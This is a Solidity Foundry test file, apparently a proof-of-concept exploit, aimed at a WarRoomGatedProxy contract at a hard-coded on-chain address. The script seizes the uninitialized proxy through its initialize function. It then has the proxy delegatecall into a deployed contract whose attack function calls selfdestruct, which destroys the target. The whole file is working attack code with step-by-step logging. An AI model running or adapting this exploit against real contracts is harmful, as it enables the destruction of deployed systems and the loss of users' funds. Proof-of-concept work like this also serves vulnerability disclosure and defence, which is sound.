// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6;

import "forge-std/Test.sol";
import "../lib/WarRoomGatedProxy.sol";

contract Exploit is Test {
    address payable constant TARGET_ADDRESS = payable(0x16EaA9f54ACD904cA22873DB2c1E39e76b128Be9);
    WarRoomGatedProxy target;
    address attacker;
    function setUp() public {
        // Set the target interface
        target = WarRoomGatedProxy(TARGET_ADDRESS);

        // Check the status of WarRoomGatedProxy before
        console.log("[+] WarRoomProxyGatedProxy exists in target addres:", isContract(TARGET_ADDRESS));
        
        // Set up the initialize parameters
        address[] memory approved = new address[](1);
        approved[0] = address(this);

        // Initialize WarRoomGatedProxy
        console.log("[+] Initializing WarRoomGatedProxy");
        target.initialize(address(this), approved);

        // Deploy the destructive malicious contract
        attacker = address(new attackerContract());
        console.log("[+] attackerContract deployed at", attacker);

        // Call the call function
        console.log("[+] Calling WarRoomProxyGatedProxy.call with the attacker contract");
        target.call(
            attacker,                                   // attackerContract address
            0,                                          // call value
            abi.encodeWithSignature("attack()"),        // the malicious initalized function
            1                                           // opereation == delegatecall
        );
    }

    function isContract(address _addr) public view returns (bool) {
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return size > 0;
    }

    function testExploit() public view {        
    // Check the status of WarRoomGatedProxy after
    console.log("[+] WarRoomProxyGatedProxy exists in target addres:", isContract(TARGET_ADDRESS));
    }
}

contract attackerContract{
    function attack() external{
        selfdestruct(payable(msg.sender));
    }
}